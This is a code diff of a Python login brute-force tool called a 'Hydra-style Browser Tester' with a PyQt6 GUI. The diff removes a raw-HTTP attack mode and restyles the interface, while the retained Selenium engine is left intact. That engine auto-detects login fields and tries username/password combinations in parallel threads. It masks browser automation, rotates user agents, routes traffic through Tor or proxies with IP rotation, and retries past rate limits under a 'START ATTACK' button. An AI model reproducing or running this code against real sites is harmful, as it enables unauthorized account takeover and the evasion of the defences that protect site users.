@@ -6,7 +6,6 @@ print("""
 \033[34m██████╔╝███████╗╚██████╔╝███████╗\033[0m \033[31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[0m
 \033[34m╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝\033[0m \033[31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m
 """)
-
 import argparse
 import threading
 import time
@@ -14,7 +13,6 @@ import random
 import os
 import sys
 import signal
-import requests
 from queue import Queue
 
 from selenium import webdriver
@@ -73,40 +71,6 @@ def change_tor_ip(control_port=9051, password=None):
         print(f"[-] Tor IP shift failed: {e}")
         return False
 
-def get_optimized_chrome_options():
-    """Generates MAXIMUM performance Chrome options for extremely low-end specs (e.g. Pentium B950, 6GB RAM)."""
-    options = webdriver.ChromeOptions()
-    options.page_load_strategy = 'none'  # 'none' allows script to continue without waiting for full page load
-    options.add_argument('--blink-settings=imagesEnabled=false') # Block images
-    options.add_argument('--disable-extensions')
-    options.add_argument('--disable-infobars')
-    options.add_argument('--disable-notifications')
-    options.add_argument('--disable-popup-blocking')
-    options.add_argument('--disable-crash-reporter')
-    options.add_argument('--disable-logging')
-    options.add_argument('--log-level=3')
-    options.add_argument('--disable-gpu') # Force disable GPU
-    options.add_argument('--disable-software-rasterizer')
-    options.add_argument('--disable-features=NetworkService,VizDisplayCompositor')
-    options.add_argument('--disable-background-timer-throttling')
-    options.add_argument('--disable-backgrounding-occluded-windows')
-    options.add_argument('--disable-breakpad')
-    options.add_argument('--disable-component-extensions-with-background-pages')
-    options.add_argument('--disable-features=TranslateUI,BlinkGenPropertyTrees')
-    options.add_argument('--disable-ipc-flooding-protection')
-    options.add_argument('--disable-renderer-backgrounding')
-    options.add_argument('--enable-features=NetworkServiceInProcess')
-    options.add_argument('--metrics-recording-only')
-    options.add_argument('--mute-audio')
-    options.add_argument('--no-sandbox')
-    options.add_argument('--disable-dev-shm-usage')
-    
-    # STEALTH
-    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
-    options.add_experimental_option('useAutomationExtension', False)
-    options.add_argument('--disable-blink-features=AutomationControlled')
-    return options
-
 # CLI ARGUMENTS (HYDRA STYLE)
 parser = argparse.ArgumentParser(description="Hydra-style Browser Tester")
 
@@ -148,20 +112,6 @@ parser.add_argument("-i", "--interactive", action="store_true",
 parser.add_argument("--gui", action="store_true",
                     help="launch the PyQt6 GUI instead of CLI")
 
-# RAW HTTP MODE FEATURES
-parser.add_argument("--raw", action="store_true",
-                    help="use raw requests mode (MUCH faster, bypasses Selenium. Ideal for low-end PCs)")
-parser.add_argument("--method", default="POST",
-                    help="HTTP method for --raw mode (e.g., POST, GET). Default: POST")
-parser.add_argument("--data", default="username=^USER^&password=^PASS^",
-                    help="Data string for --raw mode. Use ^USER^ and ^PASS^ as placeholders")
-parser.add_argument("--headers",
-                    help="Custom headers for --raw mode. Format: 'Header1: Value1|Header2: Value2'")
-parser.add_argument("--success",
-                    help="Optional explicit success message to look for to verify login (for --raw or Selenium)")
-parser.add_argument("--timeout", type=int, default=10,
-                    help="Timeout in seconds for --raw mode requests")
-
 args = parser.parse_args()
 
 # ═══════════════════════════════════════════════════════════════════
@@ -178,34 +128,26 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
     except ImportError:
         _cupp_mod = None
 
-    # ─────────────────── Enterprise / Production Stylesheet ───────────────────
+    # ─────────────────── Dark Theme Stylesheet ───────────────────
     DARK_STYLE = """
     QWidget {
-        background-color: #0E1116;
-        color: #D1D5DB;
-        font-family: 'Inter', '-apple-system', 'Segoe UI', sans-serif;
+        background-color: #0d1117;
+        color: #c9d1d9;
     }
     QGroupBox {
-        border: 1px solid #1F2937;
-        border-radius: 6px;
+        border: 1px solid #30363d;
+        border-radius: 8px;
         margin-top: 16px;
-        padding: 20px 12px 12px 12px;
-        font-weight: 600;
-        color: #F3F4F6;
-        background-color: #111827;
+        padding: 24px 10px 10px 10px;
+        font-weight: bold;
+        color: #58a6ff;
     }
     QGroupBox::title {
         subcontrol-origin: margin;
         subcontrol-position: top left;
-        left: 12px;
-        top: 2px;
-        padding: 2px 8px;
-        background-color: #1F2937;
-        color: #9CA3AF;
-        border-radius: 4px;
-        font-size: 11px;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
+        left: 14px;
+        top: 4px;
+        padding: 0 6px;
     }
     QScrollArea {
         border: none;
@@ -215,115 +157,97 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
         background: transparent;
     }
     QTabWidget::pane {
-        border: 1px solid #1F2937;
+        border: 1px solid #30363d;
         border-radius: 6px;
-        background: #0E1116;
+        background: #0d1117;
     }
     QTabBar::tab {
-        background: #111827;
-        color: #6B7280;
-        border: 1px solid transparent;
+        background: #161b22;
+        color: #8b949e;
+        border: 1px solid #30363d;
         padding: 8px 20px;
-        border-radius: 4px;
-        margin-right: 4px;
-        font-weight: 500;
-        font-size: 12px;
-        margin-bottom: 2px;
+        border-top-left-radius: 6px;
+        border-top-right-radius: 6px;
+        margin-right: 2px;
     }
     QTabBar::tab:selected {
-        background: #1F2937;
-        color: #F9FAFB;
-        border: 1px solid #374151;
-        border-bottom: 2px solid #3B82F6;
-    }
-    QTabBar::tab:hover:!selected {
-        background: #171E2B;
-        color: #D1D5DB;
+        background: #0d1117;
+        color: #58a6ff;
+        border-bottom: 2px solid #58a6ff;
     }
     QLineEdit, QSpinBox, QDoubleSpinBox, QComboBox {
-        background-color: #030712;
-        border: 1px solid #374151;
-        border-radius: 4px;
+        background-color: #161b22;
+        border: 1px solid #30363d;
+        border-radius: 6px;
         padding: 6px 10px;
-        color: #F9FAFB;
-        font-size: 12px;
-        selection-background-color: #3B82F6;
-        min-height: 18px;
+        color: #c9d1d9;
+        min-height: 20px;
     }
-    QLineEdit:focus, QSpinBox:focus, QDoubleSpinBox:focus, QComboBox:focus {
-        border: 1px solid #3B82F6;
-        background-color: #0F172A;
+    QLineEdit:focus, QSpinBox:focus, QDoubleSpinBox:focus {
+        border: 1px solid #58a6ff;
     }
     QPushButton {
-        background-color: #1F2937;
-        border: 1px solid #374151;
-        border-radius: 4px;
+        background-color: #21262d;
+        border: 1px solid #30363d;
+        border-radius: 6px;
         padding: 8px 16px;
-        color: #F3F4F6;
-        font-weight: 500;
-        font-size: 12px;
+        color: #c9d1d9;
+        font-weight: bold;
     }
     QPushButton:hover {
-        background-color: #374151;
-        border: 1px solid #4B5563;
+        background-color: #30363d;
+        border-color: #58a6ff;
     }
     QPushButton:pressed {
-        background-color: #111827;
+        background-color: #161b22;
     }
     QPushButton:disabled {
-        background-color: #111827;
-        color: #4B5563;
-        border: 1px solid #1F2937;
+        background-color: #161b22;
+        color: #484f58;
     }
     QCheckBox {
         spacing: 8px;
-        color: #9CA3AF;
-        font-weight: 400;
-        font-size: 12px;
+        color: #c9d1d9;
     }
     QCheckBox::indicator {
-        width: 14px; height: 14px;
-        border-radius: 3px;
-        border: 1px solid #4B5563;
-        background: #030712;
+        width: 16px; height: 16px;
+        border-radius: 4px;
+        border: 1px solid #30363d;
+        background: #161b22;
     }
     QCheckBox::indicator:checked {
-        background-color: #3B82F6;
-        border-color: #3B82F6;
+        background-color: #238636;
+        border-color: #238636;
     }
     QTextEdit {
-        background-color: #030712;
-        border: 1px solid #1F2937;
-        border-radius: 4px;
-        color: #E5E7EB;
-        font-family: 'JetBrains Mono', 'Cascadia Code', 'Fira Code', monospace;
+        background-color: #010409;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        color: #39d353;
+        font-family: 'Cascadia Code', 'Consolas', monospace;
         font-size: 12px;
-        padding: 10px;
+        padding: 8px;
     }
     QProgressBar {
-        background-color: #111827;
-        border: 1px solid #1F2937;
-        border-radius: 4px;
+        background-color: #161b22;
+        border: 1px solid #30363d;
+        border-radius: 6px;
         text-align: center;
-        color: #F9FAFB;
-        font-weight: 500;
-        font-size: 11px;
-        height: 18px;
+        color: #c9d1d9;
+        height: 22px;
     }
     QProgressBar::chunk {
-        background-color: #3B82F6;
-        border-radius: 3px;
+        background-color: #238636;
+        border-radius: 5px;
     }
     QLabel#titleLabel {
-        font-size: 20px;
-        font-weight: 700;
-        color: #F9FAFB;
-        letter-spacing: 0.5px;
+        font-size: 28px;
+        font-weight: bold;
+        color: #58a6ff;
     }
     QLabel#subtitleLabel {
         font-size: 12px;
-        color: #6B7280;
-        font-weight: 400;
+        color: #8b949e;
     }
     """
 
@@ -355,130 +279,115 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             found_users = set()
             multiple_users = len(users) > 1
 
-            q = Queue()
-            for u in users:
-                for p in passwords:
-                    q.put((u, p))
+            q = Queue(maxsize=1000)
+            def populate():
+                for u in users:
+                    for p in passwords:
+                        q.put((u, p))
+            threading.Thread(target=populate, daemon=True).start()
 
-            if not ctx.get('raw_mode'):
-                # Setup driver for selector detection
-                self.log("[*] Opening browser for selector setup...")
-                setup_driver = webdriver.Chrome()
-                try:
-                    setup_driver.get(ctx['target_url'])
-                    time.sleep(2)
-                    # Auto-detect
-                    setup_driver.execute_script("""
-                        document.addEventListener('click', function(e){ window._lastClicked = e.target; });
-                    """)
-                    setup_driver.execute_script("""
-                        window._autoFindFields = function() {
-                            let passwordField = document.querySelector('input[type="password"]');
-                            let userField = null;
-                            if (passwordField) {
-                                let inputs = Array.from(passwordField.form ? passwordField.form.querySelectorAll('input') : document.querySelectorAll('input'));
-                                for (let el of inputs) {
-                                    if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
-                                        userField = el; break;
-                                    }
+            # Setup driver for selector detection
+            self.log("[*] Opening browser for selector setup...")
+            setup_driver = webdriver.Chrome()
+            try:
+                setup_driver.get(ctx['target_url'])
+                time.sleep(2)
+                # Auto-detect
+                setup_driver.execute_script("""
+                    document.addEventListener('click', function(e){ window._lastClicked = e.target; });
+                """)
+                setup_driver.execute_script("""
+                    window._autoFindFields = function() {
+                        let passwordField = document.querySelector('input[type="password"]');
+                        let userField = null;
+                        if (passwordField) {
+                            let inputs = Array.from(passwordField.form ? passwordField.form.querySelectorAll('input') : document.querySelectorAll('input'));
+                            for (let el of inputs) {
+                                if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
+                                    userField = el; break;
                                 }
                             }
-                            let ucss = userField ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : '')) : null;
-                            let pcss = passwordField ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : '')) : null;
-                            return [ucss, pcss];
-                        };
-                    """)
-                    detected = setup_driver.execute_script("return window._autoFindFields();")
-                    if detected and detected[0] and detected[1]:
-                        ctx['username_selector'], ctx['password_selector'] = detected
-                        self.log(f"[+] Auto-detected  User: {detected[0]}")
-                        self.log(f"[+] Auto-detected  Pass: {detected[1]}")
-                    else:
-                        self.log("[-] Auto-detect failed. Using keyboard fallback...")
-                        self.log("    Click username field → press S")
-                        self.log("    Click password field → press T")
-                        while not (ctx.get('username_selector') and ctx.get('password_selector')):
-                            if self._stop_flag.is_set():
-                                setup_driver.quit()
-                                self.finished_signal.emit(False, "Stopped by user.")
-                                return
-                            if keyboard.is_pressed('s'):
-                                elem = setup_driver.execute_script("return window._lastClicked")
-                                if elem:
-                                    css = setup_driver.execute_script("""
-                                    function cssPath(el){ if(!el)return null;var p=[];while(el.nodeType===1){var s=el.nodeName.toLowerCase();if(el.id){s+='#'+el.id;p.unshift(s);break}else{var sib=el,n=1;while(sib=sib.previousElementSibling){if(sib.nodeName.toLowerCase()==s)n++}if(n!=1)s+=':nth-of-type('+n+')'}p.unshift(s);el=el.parentNode}return p.join(' > ')}
-                                    return cssPath(arguments[0]);
-                                    """, elem)
-                                    if css:
-                                        ctx['username_selector'] = css
-                                        self.log(f"[+] Username LOCKED: {css}")
-                                time.sleep(0.3)
-                            if keyboard.is_pressed('t'):
-                                elem = setup_driver.execute_script("return window._lastClicked")
-                                if elem:
-                                    css = setup_driver.execute_script("""
-                                    function cssPath(el){ if(!el)return null;var p=[];while(el.nodeType===1){var s=el.nodeName.toLowerCase();if(el.id){s+='#'+el.id;p.unshift(s);break}else{var sib=el,n=1;while(sib=sib.previousElementSibling){if(sib.nodeName.toLowerCase()==s)n++}if(n!=1)s+=':nth-of-type('+n+')'}p.unshift(s);el=el.parentNode}return p.join(' > ')}
-                                    return cssPath(arguments[0]);
-                                    """, elem)
-                                    if css:
-                                        ctx['password_selector'] = css
-                                        self.log(f"[+] Password LOCKED: {css}")
-                                time.sleep(0.3)
-                            time.sleep(0.1)
-                except Exception as e:
-                    self.log(f"[-] Setup error: {e}")
-                    try: setup_driver.quit()
-                    except: pass
-                    self.finished_signal.emit(False, str(e))
-                    return
+                        }
+                        let ucss = userField ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : '')) : null;
+                        let pcss = passwordField ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : '')) : null;
+                        return [ucss, pcss];
+                    };
+                """)
+                detected = setup_driver.execute_script("return window._autoFindFields();")
+                if detected and detected[0] and detected[1]:
+                    ctx['username_selector'], ctx['password_selector'] = detected
+                    self.log(f"[+] Auto-detected  User: {detected[0]}")
+                    self.log(f"[+] Auto-detected  Pass: {detected[1]}")
+                else:
+                    self.log("[-] Auto-detect failed. Using keyboard fallback...")
+                    self.log("    Click username field → press S")
+                    self.log("    Click password field → press T")
+                    while not (ctx.get('username_selector') and ctx.get('password_selector')):
+                        if self._stop_flag.is_set():
+                            setup_driver.quit()
+                            self.finished_signal.emit(False, "Stopped by user.")
+                            return
+                        if keyboard.is_pressed('s'):
+                            elem = setup_driver.execute_script("return window._lastClicked")
+                            if elem:
+                                css = setup_driver.execute_script("""
+                                function cssPath(el){ if(!el)return null;var p=[];while(el.nodeType===1){var s=el.nodeName.toLowerCase();if(el.id){s+='#'+el.id;p.unshift(s);break}else{var sib=el,n=1;while(sib=sib.previousElementSibling){if(sib.nodeName.toLowerCase()==s)n++}if(n!=1)s+=':nth-of-type('+n+')'}p.unshift(s);el=el.parentNode}return p.join(' > ')}
+                                return cssPath(arguments[0]);
+                                """, elem)
+                                if css:
+                                    ctx['username_selector'] = css
+                                    self.log(f"[+] Username LOCKED: {css}")
+                            time.sleep(0.3)
+                        if keyboard.is_pressed('t'):
+                            elem = setup_driver.execute_script("return window._lastClicked")
+                            if elem:
+                                css = setup_driver.execute_script("""
+                                function cssPath(el){ if(!el)return null;var p=[];while(el.nodeType===1){var s=el.nodeName.toLowerCase();if(el.id){s+='#'+el.id;p.unshift(s);break}else{var sib=el,n=1;while(sib=sib.previousElementSibling){if(sib.nodeName.toLowerCase()==s)n++}if(n!=1)s+=':nth-of-type('+n+')'}p.unshift(s);el=el.parentNode}return p.join(' > ')}
+                                return cssPath(arguments[0]);
+                                """, elem)
+                                if css:
+                                    ctx['password_selector'] = css
+                                    self.log(f"[+] Password LOCKED: {css}")
+                            time.sleep(0.3)
+                        time.sleep(0.1)
+            except Exception as e:
+                self.log(f"[-] Setup error: {e}")
                 try: setup_driver.quit()
                 except: pass
+                self.finished_signal.emit(False, str(e))
+                return
+            try: setup_driver.quit()
+            except: pass
 
             self.log(f"[*] Launching {ctx['threads']} worker thread(s)...")
 
             def _run_worker():
-                wd = None
-                session = None
+                options = webdriver.ChromeOptions()
+                options.add_experimental_option("excludeSwitches", ["enable-automation"])
+                options.add_experimental_option('useAutomationExtension', False)
+                options.add_argument('--disable-blink-features=AutomationControlled')
+                options.add_argument('--no-sandbox')
+                options.add_argument('--disable-dev-shm-usage')
+                UA = [
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+                ]
+                options.add_argument(f"user-agent={random.choice(UA)}")
+                if ctx.get('use_tor'):
+                    options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
+                elif ctx.get('proxies'):
+                    options.add_argument(f"--proxy-server={random.choice(ctx['proxies'])}")
+                if ctx.get('headless'):
+                    options.add_argument("--headless=new")
+                    options.add_argument("--disable-gpu")
+                    options.add_argument("--window-size=1920x1080")
                 
-                if ctx.get('raw_mode'):
-                    session = requests.Session()
-                    if ctx.get('proxies'):
-                        proxy = random.choice(ctx['proxies'])
-                        session.proxies = {"http": proxy, "https": proxy}
-                    
-                    # Parse custom headers
-                    raw_headers_str = ctx.get('raw_headers', "")
-                    headers = {}
-                    if raw_headers_str:
-                        try:
-                            for pair in raw_headers_str.split('|'):
-                                if ':' in pair:
-                                    k, v = pair.split(':', 1)
-                                    headers[k.strip()] = v.strip()
-                        except Exception as e:
-                            self.log(f"[-] Failed to parse headers: {e}")
-                    session.headers.update(headers)
-                else:
-                    options = get_optimized_chrome_options()
-                    
-                    # Dynamic options
-                    UA = [
-                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-                    ]
-                    options.add_argument(f"user-agent={random.choice(UA)}")
-                    if ctx.get('use_tor'):
-                        options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
-                    elif ctx.get('proxies'):
-                        options.add_argument(f"--proxy-server={random.choice(ctx['proxies'])}")
-                    if ctx.get('headless'):
-                        options.add_argument("--headless=new")
-                    
-                    try: wd = webdriver.Chrome(options=options)
-                    except Exception as e:
-                        self.log(f"[-] Thread startup error: {e}")
-                        return
+                wd = None
+                try: wd = webdriver.Chrome(options=options)
+                except Exception as e:
+                    self.log(f"[-] Thread startup error: {e}")
+                    return
 
                 tor_counter = 0
                 try:
@@ -506,50 +415,25 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                             delay = ctx.get('delay', 0)
                             jitter = ctx.get('jitter', 0)
                             if jitter > 0: delay += random.uniform(0, jitter)
-                            if delay > 0: 
-                                for _ in range(int(delay * 10)):
-                                    if self._stop_flag.is_set() or _GLOBAL_STOP.is_set(): break
-                                    time.sleep(0.1)
-                                    
+                            if delay > 0: time.sleep(delay)
+                            
+                            wd.get(ctx['target_url'])
+                            wait = WebDriverWait(wd, 5)
+                            u_el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ctx['username_selector'])))
+                            p_el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ctx['password_selector'])))
+                            
+                            u_el.clear()
+                            u_el.send_keys(user)
+                            p_el.clear()
+                            p_el.send_keys(pwd)
+                            p_el.send_keys(Keys.ENTER)
+                            
                             self.log(f"[*] Trying: {user} / {pwd}")
+                            time.sleep(1)
                             
                             src = ""
-                            if ctx.get('raw_mode'):
-                                raw_method = ctx.get('raw_method', 'POST')
-                                raw_data = ctx.get('raw_data', "")
-                                raw_timeout = ctx.get('raw_timeout', 10)
-                                payload = raw_data.replace("^USER^", user).replace("^PASS^", pwd)
-                                
-                                try:
-                                    if raw_method == "POST":
-                                        is_json = session.headers.get("Content-Type") == "application/json"
-                                        if is_json:
-                                            resp = session.post(ctx['target_url'], data=payload.encode('utf-8'), timeout=raw_timeout)
-                                        else:
-                                            hdrs = {"Content-Type": "application/x-www-form-urlencoded"}
-                                            resp = session.post(ctx['target_url'], data=payload, headers=hdrs, timeout=raw_timeout)
-                                    else:
-                                        resp = session.get(ctx['target_url'] + "?" + payload, timeout=raw_timeout)
-                                    src = resp.text.lower()
-                                except requests.exceptions.RequestException as e:
-                                    self.log(f"[-] Request error ({user}): {e}")
-                                    q.task_done()
-                                    continue
-                            else:
-                                wd.get(ctx['target_url'])
-                                wait = WebDriverWait(wd, 5)
-                                u_el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ctx['username_selector'])))
-                                p_el = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ctx['password_selector'])))
-                                
-                                u_el.clear()
-                                u_el.send_keys(user)
-                                p_el.clear()
-                                p_el.send_keys(pwd)
-                                p_el.send_keys(Keys.ENTER)
-                                
-                                time.sleep(1)
-                                try: src = wd.page_source.lower()
-                                except: pass
+                            try: src = wd.page_source.lower()
+                            except: pass
                             
                             if ctx.get('limit_text') and ctx['limit_text'] in src:
                                 self.log("[!] Rate limit hit!")
@@ -560,19 +444,7 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                                 q.put((user, pwd))
                                 q.task_done()
                                 continue
-                                
-                            is_valid = False
-                            success_msg = ctx.get('success_msg')
-                            error_msg = ctx.get('error_msg')
-                            if success_msg:
-                                if success_msg in src:
-                                    is_valid = True
-                            else:
-                                if error_msg and error_msg not in src:
-                                    is_valid = True
-                                    
-                            if not is_valid:
-                                # It explicitly failed
+                            if ctx.get('error_msg') and ctx['error_msg'] in src:
                                 done[0] += 1
                                 self.progress_signal.emit(done[0], total)
                                 q.task_done()
@@ -593,22 +465,20 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                                 with q.mutex: q.queue.clear()
                                 break
                             
-                            # Clean state restart (only for webdriver)
-                            if not ctx.get('raw_mode'):
-                                try: wd.quit()
-                                except: pass
-                                try: wd = webdriver.Chrome(options=options)
-                                except: pass
+                            # Clean state restart
+                            try: wd.quit()
+                            except: pass
+                            try: wd = webdriver.Chrome(options=options)
+                            except: pass
 
                         except (NoSuchElementException, TimeoutException):
                             self.log(f"[-] Missing elements for {user}, retrying...")
                             q.put((user, pwd))
                             q.task_done()
-                            if not ctx.get('raw_mode'):
-                                try: wd.quit()
-                                except: pass
-                                try: wd = webdriver.Chrome(options=options)
-                                except: pass
+                            try: wd.quit()
+                            except: pass
+                            try: wd = webdriver.Chrome(options=options)
+                            except: pass
                         except Exception as e:
                             # Catch disconnects and other errors securely
                             q.put((user, pwd))
@@ -618,15 +488,13 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                                 pass
                             else:
                                 self.log(f"[-] Error trying {user}: {e}")
-                            if not ctx.get('raw_mode'):
-                                try: wd.quit()
-                                except: pass
-                                try: wd = webdriver.Chrome(options=options)
-                                except: pass
+                            try: wd.quit()
+                            except: pass
+                            try: wd = webdriver.Chrome(options=options)
+                            except: pass
                 finally:
-                    if not ctx.get('raw_mode'):
-                        try: wd.quit()
-                        except: pass
+                    try: wd.quit()
+                    except: pass
 
             threads = []
             for _ in range(ctx['threads']):
@@ -784,38 +652,10 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             eng_f.addRow("Delay (s):", self.delay_in)
             eng_f.addRow("Jitter (s):", self.jitter_in)
             eng_f.addRow("Error text:", self.err_in)
-            
-            self.success_in = QLineEdit(""); self.success_in.setPlaceholderText("optional success text (override error text)")
-            eng_f.addRow("Success text:", self.success_in)
-            
             eng_f.addRow("Rate-limit text:", self.limit_in)
             eng_f.addRow("Cooldown (s):", self.cooldown_in)
             eng_f.addRow("", self.headless_cb)
             eng_l.addWidget(eng_grp)
-
-            # Raw Engine Settings
-            raw_grp = QGroupBox("  ⚡ Raw HTTP Mode (Fast / Bypass Selenium)")
-            raw_grp.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum)
-            raw_f = QFormLayout(raw_grp)
-            raw_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
-            raw_f.setFormAlignment(Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop)
-            raw_f.setHorizontalSpacing(12)
-            raw_f.setVerticalSpacing(12)
-            
-            self.raw_cb = QCheckBox("Enable Raw HTTP Requests")
-            self.raw_method_cb = QComboBox()
-            self.raw_method_cb.addItems(["POST", "GET"])
-            self.raw_data_in = QLineEdit("username=^USER^&password=^PASS^")
-            self.raw_headers_in = QLineEdit(""); self.raw_headers_in.setPlaceholderText("Header1: Value1 | Header2: Value2")
-            self.raw_timeout_in = QSpinBox(); self.raw_timeout_in.setRange(1, 120); self.raw_timeout_in.setValue(10)
-            
-            raw_f.addRow("", self.raw_cb)
-            raw_f.addRow("Method:", self.raw_method_cb)
-            raw_f.addRow("Payload Data:", self.raw_data_in)
-            raw_f.addRow("Headers:", self.raw_headers_in)
-            raw_f.addRow("Timeout (s):", self.raw_timeout_in)
-            
-            eng_l.addWidget(raw_grp)
             eng_l.addStretch()
             eng_scroll.setWidget(eng_w)
 
@@ -927,9 +767,11 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
 
             cupp_btns = QHBoxLayout()
             self.cupp_gen_btn = QPushButton("🧠  Generate CUPP Profile")
+            self.cupp_gen_btn.setStyleSheet("background:#238636; color:white; padding:10px; font-size:14px;")
             self.cupp_gen_btn.clicked.connect(self._run_cupp)
             
             self.seq_gen_btn = QPushButton("🔢  Generate Sequence")
+            self.seq_gen_btn.setStyleSheet("background:#1f6feb; color:white; padding:10px; font-size:14px;")
             self.seq_gen_btn.clicked.connect(self._run_sequence)
 
             self.cupp_use_btn = QPushButton("📋  Use as Password List")
@@ -948,38 +790,15 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
 
             # ═══ Bottom: Controls + Log ═══
             ctrl_row = QHBoxLayout()
-            self.start_btn = QPushButton("🚀 START ATTACK")
-            self.start_btn.setStyleSheet("""
-                QPushButton {
-                    background-color: #059669;
-                    border: 1px solid #10B981;
-                    border-radius: 4px; padding: 12px 24px;
-                    font-size: 13px; font-weight: 600; color: white;
-                }
-                QPushButton:hover { background-color: #10B981; }
-                QPushButton:pressed { background-color: #047857; }
-                QPushButton:disabled { background-color: #1F2937; border-color: #374151; color: #9CA3AF; }
-            """)
+            self.start_btn = QPushButton("🚀  START ATTACK")
+            self.start_btn.setStyleSheet("background:#238636; color:white; padding:12px 28px; font-size:15px; font-weight:bold; border-radius:8px;")
             self.start_btn.clicked.connect(self._start_attack)
-            
-            self.stop_btn = QPushButton("⛔ STOP")
-            self.stop_btn.setStyleSheet("""
-                QPushButton {
-                    background-color: #DC2626;
-                    border: 1px solid #EF4444;
-                    border-radius: 4px; padding: 12px 24px;
-                    font-size: 13px; font-weight: 600; color: white;
-                }
-                QPushButton:hover { background-color: #EF4444; }
-                QPushButton:pressed { background-color: #B91C1C; }
-                QPushButton:disabled { background-color: #1F2937; border-color: #374151; color: #9CA3AF; }
-            """)
+            self.stop_btn = QPushButton("⛔  STOP")
+            self.stop_btn.setStyleSheet("background:#da3633; color:white; padding:12px 28px; font-size:15px; font-weight:bold; border-radius:8px;")
             self.stop_btn.setEnabled(False)
             self.stop_btn.clicked.connect(self._stop_attack)
-            
-            self.clear_btn = QPushButton("🗑  WIPE LOGS")
+            self.clear_btn = QPushButton("🗑  Clear Log")
             self.clear_btn.clicked.connect(lambda: self.log_txt.clear())
-            
             ctrl_row.addWidget(self.start_btn)
             ctrl_row.addWidget(self.stop_btn)
             ctrl_row.addStretch()
@@ -992,14 +811,13 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
 
             self.log_txt = QTextEdit()
             self.log_txt.setReadOnly(True)
-            self.log_txt.document().setMaximumBlockCount(200) # 🚀 Low-End PC speedup: prevents lag when dumping 10k logs
             self.log_txt.setMinimumHeight(100)
             self.log_txt.setMaximumHeight(200) # Limits max height to avoid eating the whole window and forces it to be a small scrollable box
             root.addWidget(self.log_txt)
 
             # ── Status bar line ──
-            self.status_lbl = QLabel("Awaiting deployment...")
-            self.status_lbl.setStyleSheet("color: #64748b; font-size: 12px; padding: 4px; font-weight: bold;")
+            self.status_lbl = QLabel("Ready.")
+            self.status_lbl.setStyleSheet("color:#8b949e; font-size:11px; padding:4px;")
             root.addWidget(self.status_lbl)
 
             # ── Keyboard shortcuts: Ctrl+X / Ctrl+C to stop ──
@@ -1131,7 +949,6 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 'delay': self.delay_in.value(),
                 'jitter': self.jitter_in.value(),
                 'error_msg': self.err_in.text().strip().lower(),
-                'success_msg': self.success_in.text().strip().lower(),
                 'limit_text': self.limit_in.text().strip().lower(),
                 'cooldown': self.cooldown_in.value(),
                 'headless': self.headless_cb.isChecked(),
@@ -1139,12 +956,6 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
                 'use_tor': self.tor_cb.isChecked(),
                 'tor_port': self.tor_port_in.value(),
                 'tor_shift_every': self.tor_every_in.value(),
-                
-                'raw_mode': self.raw_cb.isChecked(),
-                'raw_method': self.raw_method_cb.currentText(),
-                'raw_data': self.raw_data_in.text(),
-                'raw_headers': self.raw_headers_in.text(),
-                'raw_timeout': self.raw_timeout_in.value(),
             }
 
             total = len(users) * len(passwords)
@@ -1179,10 +990,10 @@ if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
             self.stop_btn.setEnabled(False)
             self.status_lbl.setText(msg)
             if found:
-                self.progress.setStyleSheet("QProgressBar::chunk{background-color: #10B981; border-radius: 3px;}")
+                self.progress.setStyleSheet("QProgressBar::chunk{background:#238636; border-radius:5px;}")
                 QMessageBox.information(self, "Success", msg)
             else:
-                self.progress.setStyleSheet("QProgressBar::chunk{background-color: #EF4444; border-radius: 3px;}")
+                self.progress.setStyleSheet("QProgressBar::chunk{background:#da3633; border-radius:5px;}")
                 QMessageBox.warning(self, "Finished", msg)
 
